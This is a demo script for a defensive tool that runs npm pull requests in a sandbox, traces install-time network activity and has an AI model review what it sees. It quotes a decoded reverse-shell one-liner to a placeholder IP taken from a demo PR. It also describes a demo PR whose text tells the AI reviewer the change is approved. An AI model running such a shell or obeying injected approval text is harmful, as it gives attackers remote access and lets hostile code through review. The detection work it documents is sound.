# PR Detonator: 3-minute demo script

Everything shown is real: real GitHub PRs on
[pr-detonator-demo/demo-target](https://github.com/pr-detonator-demo/demo-target/pulls), a
real Chamber VM with eBPF tracing, and real Meta models. Record with the PR tabs pre-opened;
a check takes **about 45 s typically** (median detonation 5.9 s + model 36.5 s over the 142
scored cases), but the slowest in the eval took **six minutes** — so trigger fresh runs before
recording (push an empty commit to each branch) and show the finished results rather than
waiting on camera. Have `eval/SWEEP.md`, `eval/DWELL_TIME.md`, `eval/BASELINE.md` and the
dashboard open in tabs.

## Pre-flight, in this order

1. **Rotate the Modal token** (W10) before anything else touches the deployment.
2. `python scripts/release_ledger.py` — confirms the commit, the eval stamp, and what is still
   outstanding.
3. `python -m pytest -q` → expect **782 passed, 3 skipped**.
4. Run the closing command once (below) and check it prints readably. It used to print
   HTML-entity-encoded (`color&#45;helper&#64;1&#46;0&#46;0`) because the renderer is shared with
   GitHub comments; fixed Nov 3, but confirm rather than assume.
5. Open each PR tab and confirm the check actually concluded. If the Chamber is unreachable the
   old comments remain on GitHub and are still usable as evidence (see Fallbacks).
6. **Screen hygiene:** `eval/SWEEP.md` withholds the disclosed package
   (`<withheld pending disclosure>`, hosts redacted), so the cold open is safe to show. But
   `eval/SWEEP500.json` / `.md` name a *different* blocked package, and the disclosed one's
   identifier is recoverable from this repo's `git log`. Close terminal tabs, editor tabs and
   history that could surface either.

## 0:00 – 0:25 · Cold open: a real finding

> "This is a tool that reviews pull requests by *running* them. To test it, I pointed it at
> a hundred npm packages published in the last few minutes — packages nobody had vetted.
> Seventy-three of them installed on this platform; all seventy-three came back clean, and one
> was flagged. That one, during install, connected to a hardcoded IP address with TLS
> verification turned off and ran whatever came back. It isn't malware — it's a real package
> with an unsafe fallback — but no advisory existed, nobody told us to look, and the behavior
> alone gave it away. That's the whole idea."

Show `eval/SWEEP.md` (the finding row) briefly — **safe to show**: that file records the package
as `<withheld pending disclosure>` with its host redacted. Don't say the name (reported
privately Nov 2, no reply yet). "73 of 73 clean, one flagged" is verified against
`eval/SWEEP.json`: 73 rows with `exit_code 0`, all `Clean`; the other 27 are 24 that exited
nonzero and 3 that timed out, all reported as **Could not verify**, never clean.

## 0:25 – 0:45 · Why this, why now

> "Supply-chain attacks run at `npm install`, before anyone imports a line of code — and they
> arrive as one-line version bumps, so there's nothing in the diff to review. And now AI
> agents are opening those PRs and picking the dependencies. Something has to check what the
> agent just installed. We do it by running it in a sandbox and watching the kernel."

One line on the architecture: **the model predicts, the kernel verifies, rules set the floor.**

## 0:45 – 1:25 · The dependency did it (E8)

[PR #12](https://github.com/pr-detonator-demo/demo-target/pull/12), "Bump color-helper from
1.0.0 to 1.0.1" — a Dependabot-style one-line diff.
1. The check is **🛑 Blocked**; merge disabled by branch protection.
2. **Files changed**: inline comment on the bumped line, naming **color-helper**.
3. The report's *Where it came from* points **inside the dependency** —
   `node_modules/color-helper/install.js`, with the line decoded by Muse and a sha256.
4. *Compared to the base branch* → **New at install: `tcp:203.0.113.10:4444`** (differential).

> "The author is innocent — it's a version bump. The kernel recorded that the dependency's
> install script opened a socket, we captured the file out of the sandbox, and the model
> decoded the exact line. Differential detonation shows this is new versus the old version."

## 1:25 – 1:50 · Obfuscation decoded, and it can't be fooled (E5 + E6)

- [PR #8](https://github.com/pr-detonator-demo/demo-target/pull/8): inline comment on the
  `cp.spawn` line; Muse decoded the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1`.
- [PR #9](https://github.com/pr-detonator-demo/demo-target/pull/9): the PR text tells the AI
  reviewer it's approved.

> "Muse flags the injection itself — but even if it were fooled, the analysis can only raise
> severity, never lower it. There's exactly one path where a prediction can clear a finding,
> and it needs two keys: the host has to be named before the install ran *and* be on a list
> the PR author can't write to. So you can't allowlist your own domain by describing it in
> your own pull request. Prompt Guard 2 runs too; we measured it, it catches blunt jailbreaks
> but not this kind, which is exactly why the floor isn't a model."

## 1:50 – 2:15 · It triages instead of crying wolf (E9)

[PR #13](https://github.com/pr-detonator-demo/demo-target/pull/13), "Add PDF export with
puppeteer" → **⚠️ Needs review**. Show the **Triage** section: the investigator agent made 4
tool calls and wrote *"puppeteer, published 2013, maintainers unchanged, install.mjs only
calls downloadBrowsers(); storage.googleapis.com is a known package CDN."*

> "A real package that downloads a browser lands on 'needs review', not blocked. The agent
> does the first pass of the human's homework — registry age, maintainer changes, the actual
> script — and can escalate but never clear."

## 2:15 – 2:40 · The evidence

Flash three things:
- **104 popular packages: nothing hard-blocked** — 3 needs review, 6 we could not verify
  (`eval/results.md`). **100 uncurated live packages** (`eval/SWEEP.md`): 73 of 73 that
  installed came back clean, one flagged. **500 off the registry feed** (`eval/SWEEP500.md`):
  413 of the 421 that installed clean, 7 needs review, **1 blocked**.
- **`npm audit` says "0 vulnerabilities"** on the same attacks (`eval/BASELINE.md`) — it is the
  default tool everyone already runs, and it has no advisory to go on yet; dwell time of real
  incidents was hours to months (`eval/DWELL_TIME.md`).
- The **dashboard** and its **behavior atlas** — what each package did at install.

> "Across 104 popular packages nothing was hard-blocked — three went to needs review, and six
> we couldn't verify, which we report as unverified rather than clean. Then 500 straight off
> the registry feed: 413 of the 421 that installed came back clean, seven needs review, one
> blocked. That list is unlabelled, so I'm not going to tell you that block was right or
> wrong — we don't know, and the write-up says so. Advisory tools are retrospective: they
> protect you from last year's attack. This catches behavior the first time it runs, in
> seconds, for about two cents a PR."

**Do not say "zero false positives" or "nothing benign blocked" about the 500-package sweep.**
`eval/SWEEP500.md` records **1 blocked of 421**, and that corpus has no ground-truth labels, so
calling the block a true or false positive is a claim we cannot support. The blocked package
installed cleanly and fetched a Python toolchain, which is plausibly legitimate. Saying "one
blocked, unlabelled, we don't know" is both honest and a stronger answer if a judge pushes —
and it is what every document in the repo now says.

## 2:40 – 3:00 · Where this goes — and show it working

Run this live; it takes a second and needs no network:

```
python -m brain.sbom diff eval/sbom/color-helper_at_1.0.0.json \
                          eval/sbom/color-helper_at_1.0.1.json eval/sbom/public_key.pem
```

Same package, two versions, detonated under identical conditions. Verified output, exactly as
it prints (pinned by `test_the_diff_cli_actually_uses_the_plain_renderer`, so it cannot drift
from this script without failing the suite):

```
### Install-time behavior: color-helper@1.0.0 → color-helper@1.0.1

Signatures: old verified, new verified. A signature proves the record wasn't edited, not that
the package is safe.
Comparability: **partially comparable** — environment not recorded for both versions

**Look at first** (new behavior, not a verdict):

- new raw IP contacted at install: 203.0.113.10
- new install script: /work/node_modules/color-helper/install.js

| Change | Values |
|---|---|
| added hosts | 203.0.113.10 |
| install script /work/node_modules/color-helper/install.js | none → 967cb59a0ba5 |
```

> "Detonate every new npm release minutes after publish and diff its behavior against the last
> version — 'this release started talking to a new address' as an alert, not a GHSA days later.
> That's the same signed record you just watched verify. Lockfiles pin bytes; this pins
> behavior."

Two things to say out loud, because they're the honest part: the signature proves the **record**
wasn't edited, not that the package is safe — and the tool reports this pair as only
*partially comparable*, because these two records don't pin the image and Node versions. It
tells you what it couldn't compare instead of quietly comparing anyway.

## Fallbacks

- If a live check is slow, show the already-completed run on the same PR.
- If the Chamber is down, the PR comments and inline reviews stay on GitHub as evidence.
- Keep the package name in the cold open **unspoken** until the maintainer has shipped a fix.
  Say "we reported it privately to the maintainer"; never "fixed" or "acknowledged" unless they
  reply (report sent Nov 2, 2026, no response yet). Also avoid
  claiming the name is withheld: it is recoverable from this repo's git history, so the right
  phrasing is that we are not naming it here, not that it is concealed. Check no terminal tab,
  JSON file or `git log` on screen shows the identifier.
